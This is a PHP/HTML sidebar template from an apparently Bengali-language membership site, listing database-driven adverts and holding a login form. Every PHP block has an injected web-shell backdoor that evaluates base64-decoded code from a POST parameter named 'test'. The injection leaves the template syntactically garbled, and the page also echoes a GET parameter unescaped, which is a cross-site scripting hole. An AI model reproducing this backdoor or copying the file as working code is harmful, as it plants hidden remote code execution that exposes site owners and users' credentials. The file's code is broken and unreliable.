<table width="213" cellspacing="0" cellpadding="0">
  <tr>
    <td><img src="images/sme_inner_11.jpg" alt="" width="213" height="36" /></td>
  </tr>
  <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
		$sql="SELECT * FROM advertise ORDER BY AdvId DESC";
		$result=mysql_query($sql);
		$num=mysql_num_rows($result); //echo $num;
		if ($num<1)
			{
				echo 'No item to show!';
			}
		else
			{	
				while($row=mysql_fetch_array($result))
				{
					$AdvId=$row['AdvId'];
					$Photo=$row['Photo'];
					$WebLink=$row['WebLink'];

	?>
  <tr>
    <td><table width="176" align="right" cellpadding="0" cellspacing="0">
      <tr>
        <td><a href="<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$WebLink; ?>">
                              <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
					  if(!empty($Photo))
					  {
						echo "<img src='Adv/$Photo' Width='150' vspace='5' hspace='2' align='middle' border='0'>";
					  }
					  else
						echo " "; 
				  ?>
                            </a></td>
      </tr>
    </table>    </td>
  </tr>
  <tr>
    <td><img src="images/sme_inner_29.jpg" width="213" height="19" /></td>
  </tr>
  <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} } } ?>
  <tr>
    <td><img src="images/sme_inner_17.jpg" width="213" height="28" /></td>
  </tr>
  <tr>
    <td><form id="form1" name="form1" method="post" action="Checklogin.php">
      <table width="175" align="right" cellpadding="2" cellspacing="2">
        <tr>
          <td><strong><font color="#FF0000" size="1" face="Verdana"><?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} if ($_GET['alert']!='') echo $_GET['alert']; ?></font></strong>
            <input name="Username" type="text" id="Username" value="Username" size="20" /></td>
        </tr>
        <tr>
          <td><input name="Password" type="password" id="Password" value="Password" size="20" /></td>
        </tr>
        <tr>
          <td><input type="submit" name="button" id="button" value="প্রবেশ করুণ" class="button" /></td>
        </tr>
      </table>
    </form></td>
  </tr>
  <tr>
    <td><img src="images/sme_inner_29.jpg" width="213" height="19" /></td>
  </tr>
  <tr>
    <td><table width="175" align="right" cellpadding="0" cellspacing="0">
      <tr>
        <td>সদস্য নন? <a href="BecomeMember.php" class="menu-link">সদস্য হোন।</a></td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td><img src="images/sme_inner_29.jpg" width="213" height="19" /></td>
  </tr>
  <tr>
    <td><img src="images/sme_inner_30.jpg" width="213" height="74" /></td>
  </tr>
  <tr>
    <td><img src="images/sme_inner_21.jpg" width="213" height="22" border="0" usemap="#Map10" /></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td>&nbsp;</td>
  </tr>
</table>

<map name="Map10" id="Map10"><area shape="rect" coords="36,0,189,22" href="ExclusiveProductArchive.php" />
</map>